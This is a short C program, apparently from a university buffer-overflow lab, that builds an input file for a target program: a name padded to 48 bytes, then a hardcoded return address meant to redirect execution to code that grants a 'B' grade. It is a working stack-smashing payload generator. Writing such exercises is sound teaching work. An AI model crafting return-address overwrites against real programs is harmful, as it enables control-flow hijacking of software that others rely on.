/*--------------------------------------------------------------------*/
/* createdataB.c                                                           */
/* Author: Marti Vives and Minh-Thi Nguyen                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>


/* reads from the commandline the name(s) of the
student (assumes it does not exceed 48 bytes). 
Writes to a file named dataB */

int main(int argc, char* argv[])
{
	int i;
	char* p;
	int cont_name2buf;
	int cont_name = 0;
	unsigned long retB = 0x400858;
	FILE *psFile; /* dataB file */

	psFile = fopen("dataB", "w");

	/* recall argv[0] is the program name so start at 1 */
	for (i = 1; i < argc; i++)
	{

		/* put each string argv */
		for (p = argv[i]; *p != '\0'; p++)
		{
			putc(*p,psFile);
		}

		cont_name+=strlen(argv[i]);
		/* add a space between argv's */
		if (i != (argc-1)) {
			putc(' ',psFile);
			cont_name++;
		}
	}

	/* Finish filling all the buf array */
	cont_name2buf = 48-cont_name;
	for (i = 0; i < cont_name2buf; i++)
 		putc('\0', psFile); 

 	/* Rewrite return addresss to main directed at setting B grade */
 	fwrite(&retB, sizeof(unsigned long), 1, psFile);

	return 0;
}